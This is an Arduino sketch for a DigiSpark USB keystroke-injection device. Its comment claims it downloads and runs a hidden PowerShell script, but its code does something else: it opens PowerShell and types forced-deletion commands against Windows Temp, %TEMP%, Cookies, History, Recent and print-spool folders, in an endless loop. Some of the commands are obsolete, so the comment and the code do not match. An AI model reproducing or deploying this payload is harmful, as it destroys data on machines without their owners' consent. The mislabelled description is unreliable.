//This DigiSpark scripts downloads and executes a powershell script in hidden mode.
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
   
  DigiKeyboard.println("del /s /f /q c:\\Windows\\Temp\\*.*");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("rd /s /q c:\\Windows\\Temp");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("md c:\\Windows\\Temp");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("del /s /f /q %TEMP%\\*.*");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("rd /s /q %TEMP%");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("md %TEMP%");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("deltree /y c:\\Windows\\Temp\\or~1 && deltree /y c:\\Windows\\Temp && deltree /y c:\\Windows\\Tmp && deltree /y c:\\Windows\\ff*.tmp && deltree /y c:\\Windows\\History && deltree /y c:\\Windows\\Cookies && deltree /y c:\\Windows\\Recent && deltree /y c:\\Windows\\Spool\\Printers");

  DigiKeyboard.delay(50);
  DigiKeyboard.print("del c:\\WIN386.SWP");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
 
}
